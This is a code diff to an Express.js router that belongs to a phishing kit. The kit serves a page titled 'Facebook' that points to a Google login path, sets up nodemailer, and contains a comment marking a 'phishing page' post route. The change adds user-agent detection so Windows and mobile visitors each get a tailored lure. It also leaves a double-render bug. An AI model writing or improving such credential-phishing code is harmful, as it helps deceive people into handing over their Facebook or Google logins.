@@ -1,6 +1,7 @@
 var express = require('express');
 var router = express.Router();
 const nodemailer = require("nodemailer");
+var useragent = require('useragent');
 
 // create a new database file users.db or open existing users.db
 
@@ -26,7 +27,12 @@ let transporter = nodemailer.createTransport({
 // });
 /* GET home page. */
 router.get('/', function(req, res, next) {
-  res.render('index', { title: "Facebook", 'domain-name': 'gmail.com/', 'domain-path': '/auth/google/login' });
+  
+  const ua = useragent.parse(req.headers['user-agent'])
+  if (ua.os.family === 'Windows'){
+    res.render('index', { title: "Facebook", 'domain-name': 'gmail.com/', 'domain-path': '/auth/google/login' });
+  }
+  res.render('mobile/index')
 });
 
 // post to phishing page 
